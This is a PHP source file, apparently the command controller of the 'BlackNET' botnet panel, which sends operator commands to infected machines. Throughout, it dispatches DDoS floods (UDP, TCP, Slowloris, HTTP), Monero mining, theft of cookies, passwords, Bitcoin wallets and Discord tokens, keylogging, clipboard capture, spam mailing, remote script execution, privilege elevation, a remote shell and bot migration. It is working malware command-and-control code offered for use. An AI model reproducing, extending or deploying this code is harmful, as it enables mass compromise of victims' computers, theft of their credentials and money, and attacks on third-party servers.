<?php

/**
 * BlackNET Command Controller
 *
 * @version 3.7.0
 * @copyright MIT
 * @author BlackHaker <farisksa79@gmail.com>
 * @package BlackNET
 * @link https://github.com/BlackHacker511/BlackNET
 */

$t = new BlackNET\Template("layouts");

if ($auth->checkToken($_POST['csrf'], $_SESSION['csrf']) == false) {
    $err = $utils->alert("CSRF token is invalid.", "danger", "times-circle");
}

echo $utils->input("csrf", $utils->sanitize($_POST['csrf']));

$client = new BlackNET\Clients($database, $utils);

if (isset($_POST['client'])) {
    $clientHWD = isset($_POST['client']) ? json_encode($_POST['client']) : null;
} elseif (isset($_POST['clients'])) {
    $clientHWD = $_POST['clients'];
} else {
    $err = $utils->alert(
        "You did not select a client to execute this command Please go back and choose a client.",
        "danger",
        "times-circle"
    );
}

if (isset($clientHWD)) {
    echo $utils->input("clients", $clientHWD);
}

$command = $utils->sanitize($_POST['command']);

echo $utils->input("command", $command);

$Y = DATA_SPLITTER;

if (isset($err)) {
    echo $err;
} else {
    switch ($command) {
        case "nocommand":
            echo $utils->alert(
                "You did not select a command to execute on the target deveice Please go back and choose a command.",
                "danger",
                "times-circle"
            );
            break;
        case "uninstall":
            $client->send($clientHWD, "Uninstall");
            echo $utils->alert("Client has been removed", "success", "check-circle");
            break;

        case "ddosw":
            if (isset($_POST['Form2'])) {
                switch ($utils->sanitize($_POST['attacktype'])) {
                    case 'UDP Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "UDPAttack" . $Y . $utils->sanitize(
                                $_POST['TargetURL'] . $Y .
                                    $_POST['thread'] . $Y .
                                    $_POST['timeout']
                            )
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'TCP Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "TCPAttack" . $Y .
                                $utils->sanitize(
                                    $utils->cleanHost($_POST['TargetURL']) . $Y
                                        . $_POST['thread'] . $Y
                                        . $_POST['timeout'] . $Y . $_POST['port']
                                )
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'ARME Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "ARMEAttack" . $Y . $utils->sanitize(
                                $_POST['TargetURL'] . $Y .
                                    $_POST['thread'] . $Y .
                                    $_POST['timeout']
                            )
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'Slowloris Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "SlowlorisAttack" . $Y .
                                $utils->sanitize($_POST['TargetURL'] . $Y
                                    . $_POST['thread'] . $Y . $_POST['timeout'])
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'PostHTTP Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "PostHTTPAttack" . $Y .
                                $utils->sanitize($_POST['TargetURL'] . $Y
                                    . $_POST['thread'] . $Y . $_POST['timeout'])
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'HTTPGet Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "HTTPGetAttack" . $Y .
                                $utils->sanitize($_POST['TargetURL'] . $Y .
                                    $_POST['thread'] . $Y . $_POST['timeout'])
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'BandwidthFlood Attack':
                        $client->send(
                            $clientHWD,
                            "StartDDOS" . $Y . "BWFloodAttack" . $Y .
                                $utils->sanitize($_POST['TargetURL'] . $Y .
                                    $_POST['thread'] . $Y . $_POST['timeout'])
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    default:
                        echo $utils->alert(
                            "Attack Type does not exist !",
                            "danger",
                            "times-circle"
                        );
                        break;
                }
            }
            echo $t->loadTemplate("ddos_attack");
            break;

        case 'stopddos':
            if (isset($_POST['Form2'])) {
                switch ($utils->sanitize($_POST['attacktype'])) {
                    case 'UDP Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "UDPAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'TCP Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "TCPAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'ARME Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "ARMEAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'Slowloris Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "SlowlorisAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'PostHTTP Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "PostHTTPAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'HTTPGet Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "HTTPGetAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    case 'BandwidthFlood Attack':
                        $client->send($clientHWD, "StopDDOS" . $Y . "BWFloodAttack");
                        echo $utils->alert("Command has been send", "success", "check-circle");
                        break;

                    default:
                        echo $utils->alert("Attack Type does not exist !", "danger", "times-circle");
                        break;
                }
            }
            echo $t->loadTemplate("stop_ddos");
            break;

        case "xmrminer":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "XMRMiner" . $Y .
                        $utils->sanitize($_POST['poolurl']) . $Y .
                        $utils->sanitize($_POST['poolusername']) . $Y .
                        $utils->sanitize($_POST['poolpassword']) . $Y .
                        $utils->sanitize($_POST['cpupriority']) . $Y .
                        $utils->sanitize($_POST['thread']) . $Y .
                        $utils->sanitize($_POST['mode'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate('miner_settings');
            break;

        case "uploadf":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "UploadFile" . $Y .
                        $utils->sanitize($_POST['FileURL']) . $Y . $utils->sanitize($_POST['Name'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("upload");
            break;

        case "uploadfd":
            if (isset($_POST['Form2'])) {
                $upload_file = new BlackUpload\Upload($_FILES['file'], [
                    "folder_name" => "upload",
                    "folder_path" => realpath(APP_PATH . "upload/"),
                ], "classes/blackupload/");

                $upload_file->enableProtection();

                if (
                    $upload_file->checkForbidden() &&
                    $upload_file->checkExtension() &&
                    $upload_file->checkMime()
                ) {
                    if ($upload_file->upload()) {
                        $client->send(
                            $clientHWD,
                            "UploadFile" . $Y . $upload_file->generateDirectDownloadLink()
                                . $Y . $upload_file->getName()
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                    }
                } else {
                    $json = $upload_file->getLogs();
                    echo $utils->alert(
                        $upload_file->getMessage($json[0]['message']),
                        "danger",
                        "times-circle"
                    );
                }
            }
            echo $t->loadTemplate("upload_file");
            break;

        case "ping":
            $client->send($clientHWD, "Ping");
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case "msgbox":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "ShowMessageBox" . $Y .
                        $utils->sanitize($_POST['Content']) . $Y .
                        $utils->sanitize($_POST['MessageTitle']) . $Y .
                        $utils->sanitize($_POST['msgicon']) . $Y .
                        $utils->sanitize($_POST['msgbutton'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("messagebox");
            break;

        case "openwp":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "OpenPage" . $Y . $utils->sanitize($_POST['Weburl'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("openpage");

            break;

        case "openhidden":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "OpenHidden" . $Y . $utils->sanitize($_POST['Weburl'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("openpage");
            break;

        case "sendemail":
            if (isset($_POST['Form2'])) {
                echo $utils->alert("Command has been send", "success", "check-circle");
                $client->send($clientHWD, "SpamEmail" . $Y .
                    $utils->sanitize($_POST['Host']) . $Y .
                    $utils->sanitize($_POST['Port']) . $Y .
                    $utils->sanitize($_POST['Username']) . $Y .
                    $utils->base64EncodeUrl($utils->sanitize($_POST['Password'])) . $Y .
                    $utils->sanitize($_POST['EmailFrom']) . $Y .
                    str_replace(
                        array("\r", "\n"),
                        array(null, ','),
                        $utils->sanitize($_POST['EmailList'])
                    ) . $Y .
                    $utils->sanitize($_POST['Subject']) . $Y .
                    str_replace("\n", "<br />", $utils->sanitize($_POST['Content'])));
            }
            echo $t->loadTemplate("sendemail");
            break;

        case "close":
            echo $utils->alert("Command has been send", "success", "check-circle");
            $client->updateStatus($clientHWD, "Offline");
            $client->send($clientHWD, 'Close');
            break;

        case "moveclient":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "MoveClient" . $Y . $utils->sanitize($_POST['newHost'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("move_bot");
            break;

        case "invokecustom":
            if (isset($_POST['Form2'])) {
                $hasOutput = isset($_POST['hasoutput']) ? "True" : "False";

                $upload_file = new BlackUpload\Upload($_FILES['PluginFile'], [
                    "folder_name" => "plugins",
                    "folder_path" => realpath(APP_PATH . "plugins/"),
                ], "classes/blackupload/");

                $upload_file->enableProtection();
                if (
                    $upload_file->checkForbidden() &&
                    $upload_file->checkExtension() &&
                    $upload_file->checkMime()
                ) {
                    if ($upload_file->upload()) {
                        $client->send(
                            $clientHWD,
                            "InvokeCustom" . $Y . $upload_file->getName()
                                . $Y . $utils->sanitize($_POST['ClassName']) . $Y .
                                $utils->sanitize($_POST['MethodName']) . $Y .
                                $hasOutput . $Y . $utils->sanitize($_POST['outputType'])
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                    }
                } else {
                    $json = $upload_file->getLogs();
                    echo $utils->alert(
                        $upload_file->getMessage($json[0]['message']),
                        "danger",
                        "times-circle"
                    );
                }
            }
            echo $t->loadTemplate("run_custom");
            break;

        case "getfile":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "GetFile" . $Y . $utils->sanitize($_POST['FilePath'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("get_file");
            break;

        case "blacklist":
            $client->send($clientHWD, 'Blacklist');
            echo $utils->alert("Client has been blocked", "success", "check-circle");
            break;

        case 'tkschot':
            $client->send($clientHWD, 'Screenshot');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'stealcookie':
            $client->send($clientHWD, 'StealCookie');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'stealchcookie':
            $client->send($clientHWD, 'StealChCookies');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'stealps':
            $client->send($clientHWD, 'InstalledSoftwares');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'startkl':
            $client->send($clientHWD, 'StartKeylogger');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'stopkl':
            $client->send($clientHWD, 'StopKeylogger');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'getlogs':
            $client->send($clientHWD, 'RetriveLogs');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'stealpassword':
            $client->send($clientHWD, "StealPassword");
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case "stealbtc":
            $client->send($clientHWD, "StealBitcoin");
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case "stealdiscord":
            $client->send($clientHWD, "StealDiscord");
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case "getclipboard":
            $client->send($clientHWD, "GetClipboard");
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case "tempclean":
            $client->send($clientHWD, "CleanTemp");
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;


        case "torrentf":
            if (isset($_POST['Form2'])) {
                $upload_file = new BlackUpload\Upload($_FILES['file'], [
                    "folder_name" => "upload",
                    "folder_path" => realpath(APP_PATH . "upload/"),
                ], "classes/blackupload/");

                $upload_file->enableProtection();

                if (
                    $upload_file->checkForbidden() &&
                    $upload_file->checkExtension() &&
                    $upload_file->checkMime()
                ) {
                    if ($upload_file->upload()) {
                        $client->send(
                            $clientHWD,
                            "TorrentSeeder" . $Y .
                                $upload_file->generateDirectDownloadLink()
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                    }
                } else {
                    $json = $upload_file->getLogs();
                    echo $utils->alert(
                        $upload_file->getMessage($json[0]['message']),
                        "danger",
                        "times-circle"
                    );
                }
            }
            echo $t->loadTemplate("upload_torrent_file");
            break;

        case "torrentl":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "TorrentSeeder" . $Y .
                        $utils->sanitize($_POST['FileURL'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("upload_torrent_link");
            break;


        case 'exec':
            if (isset($_POST['Form2'])) {
                $file_name = $utils->sanitize($_POST['file_name']);
                $data = $_POST['data'];
                $req = new BlackNET\POST();
                $req->prepare(realpath("scripts/"), $file_name, $data);
                if ($req->write() == true) {
                    $client->send(
                        $clientHWD,
                        "ExecuteScript" . $Y .
                            $utils->sanitize($_POST['scriptType']) . $Y .
                            $utils->sanitize($_POST['file_name'])
                    );
                    echo $utils->alert("Command has been send", "success", "check-circle");
                }
            }
            echo $t->loadTemplate("execute");
            break;

        case "update":
            if (isset($_POST['Form2'])) {
                $upload_file = new BlackUpload\Upload($_FILES['file'], [
                    "folder_name" => "upload",
                    "folder_path" => realpath(APP_PATH . "upload/"),
                ], "classes/blackupload/");

                $upload_file->enableProtection();

                if (
                    $upload_file->checkForbidden() &&
                    $upload_file->checkExtension() &&
                    $upload_file->checkMime()
                ) {
                    if ($upload_file->upload()) {
                        $client->send(
                            $clientHWD,
                            "UpdateClient" . $Y .
                                $upload_file->generateDirectDownloadLink() . $Y . $upload_file->getName()
                        );
                        echo $utils->alert("Command has been send", "success", "check-circle");
                    }
                } else {
                    $json = $upload_file->getLogs();
                    echo $utils->alert(
                        $upload_file->getMessage($json[0]['message']),
                        "danger",
                        "times-circle"
                    );
                }
            }
            echo $t->loadTemplate("update");
            break;

        case 'logoff':
            $client->send($clientHWD, 'Logoff');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'restart':
            $client->send($clientHWD, 'Restart');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'shutdown':
            $client->send($clientHWD, 'Shutdown');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'elev':
            $client->send($clientHWD, 'Elevate');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case 'restart':
            $client->send($clientHWD, 'Restart');
            echo $utils->alert("Command has been send", "success", "check-circle");
            break;

        case "rshell":
            if (isset($_POST['Form2'])) {
                $client->send(
                    $clientHWD,
                    "RemoteShell" . $Y .
                        $utils->sanitize($_POST['shellprovider']) . $Y .
                        $utils->sanitize($_POST['shellcommand'])
                );
                echo $utils->alert("Command has been send", "success", "check-circle");
            }
            echo $t->loadTemplate("rshell");
            break;
        default:
            echo $utils->alert("Incorrect command !!", "danger", "times-circle");
            break;
    }
}
